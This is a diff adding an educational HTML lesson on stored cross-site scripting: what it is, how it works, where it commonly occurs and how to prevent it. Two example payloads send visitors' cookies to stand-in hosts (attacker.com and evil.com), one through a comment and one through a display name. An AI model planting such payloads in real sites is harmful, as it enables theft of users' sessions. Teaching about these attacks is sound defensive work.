@@ -1,0 +1,174 @@
+<div class="lesson-view-content">
+  <h1>Stored Cross-Site Scripting (XSS)</h1>
+
+  <div class="definition-box">
+    <h2>What is Stored XSS?</h2>
+    <p>
+      Stored XSS (also known as Persistent XSS) occurs when malicious scripts
+      are permanently stored on the target servers, such as in a database,
+      message forum, comment field, visitor log, or other storage medium. The
+      victim then retrieves the malicious script from the server when they
+      request the stored information.
+    </p>
+  </div>
+
+  <h2>How Stored XSS Works</h2>
+  <p>The typical flow of a stored XSS attack:</p>
+  <ol>
+    <li>
+      Attacker injects malicious script into a website's storage (comments, user
+      profiles, etc.)
+    </li>
+    <li>
+      Website stores the malicious script in its database without proper
+      validation or sanitization
+    </li>
+    <li>
+      When victims browse the affected page, the server delivers the stored
+      malicious script
+    </li>
+    <li>
+      Victims' browsers execute the script as if it came from a trusted source
+    </li>
+    <li>
+      The malicious script runs with the privileges of the web application in
+      the victim's browser
+    </li>
+  </ol>
+
+  <div class="example-box">
+    <h3>Stored XSS Example:</h3>
+    <p>Consider a comment section on a blog where users can post comments:</p>
+    <p>An attacker posts the following comment:</p>
+    <p>
+      <code
+        >&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code
+      >
+    </p>
+    <p>
+      The comment is stored in the website's database and displayed on the blog
+      post page.
+    </p>
+    <p>
+      When other users view the page with the comment, their browsers execute
+      the script, sending their cookies to the attacker's server.
+    </p>
+  </div>
+
+  <h2>Why Stored XSS is Dangerous</h2>
+  <p>
+    Stored XSS is often considered more dangerous than other XSS types because:
+  </p>
+  <ul>
+    <li>
+      The attack is <strong>persistent</strong> and doesn't require individually
+      targeting victims
+    </li>
+    <li>
+      It can affect <strong>multiple users</strong> who visit the compromised
+      page
+    </li>
+    <li>
+      Victims don't need to click any special links or perform specific actions
+      beyond visiting the legitimate site
+    </li>
+    <li>
+      The attack appears to come from a trusted source, making it more likely to
+      succeed
+    </li>
+    <li>
+      Can remain active for long periods until discovered and removed from
+      storage
+    </li>
+  </ul>
+
+  <div class="danger-box">
+    <h3>Increased Impact</h3>
+    <p>
+      Stored XSS attacks can reach a much larger audience than reflected XSS
+      attacks. A single stored XSS vulnerability on a popular website could
+      potentially affect thousands or millions of users, making it a high-value
+      target for attackers.
+    </p>
+  </div>
+
+  <h2>Common Stored XSS Vulnerable Points</h2>
+  <p>Stored XSS vulnerabilities commonly occur in:</p>
+  <ul>
+    <li>
+      <strong>User profiles</strong> - Name fields, biographical information,
+      website links
+    </li>
+    <li>
+      <strong>Comments sections</strong> - Blog comments, product reviews, forum
+      posts
+    </li>
+    <li>
+      <strong>Message boards</strong> - Private and public messages between
+      users
+    </li>
+    <li>
+      <strong>User-generated content</strong> - Wiki pages, collaborative
+      documents
+    </li>
+    <li>
+      <strong>Social media feeds</strong> - Status updates, shared content
+    </li>
+    <li>
+      <strong>Contact forms</strong> - Where submission data is displayed to
+      administrators
+    </li>
+  </ul>
+
+  <div class="example-box">
+    <h3>Real-world Example:</h3>
+    <p>
+      A user updates their display name to:
+      <code
+        >John&lt;script&gt;fetch('https://evil.com/'+document.cookie)&lt;/script&gt;</code
+      >
+    </p>
+    <p>
+      When other users view a list of members or comments by this user, the
+      script executes in their browsers.
+    </p>
+  </div>
+
+  <h2>Prevention Techniques</h2>
+  <p>To prevent stored XSS vulnerabilities:</p>
+  <ol>
+    <li>
+      <strong>Input Validation</strong> - Validate all user input on the server
+      side
+    </li>
+    <li>
+      <strong>Output Encoding</strong> - Encode HTML special characters before
+      displaying user-generated content
+    </li>
+    <li>
+      <strong>Content Security Policy (CSP)</strong> - Implement strict CSP
+      headers
+    </li>
+    <li>
+      <strong>HTTPOnly Cookies</strong> - Set HTTPOnly flag on sensitive cookies
+      to prevent JavaScript access
+    </li>
+    <li>
+      <strong>Sanitization Libraries</strong> - Use trusted libraries to clean
+      user input
+    </li>
+    <li>
+      <strong>Regular Security Audits</strong> - Regularly test applications for
+      XSS vulnerabilities
+    </li>
+  </ol>
+
+  <div class="danger-box">
+    <h3>Never Trust User Input</h3>
+    <p>
+      The fundamental principle for preventing stored XSS is to never trust user
+      input. Always validate, sanitize, and encode user-supplied data before
+      storing it and before outputting it to web pages.
+    </p>
+  </div>
+</div>
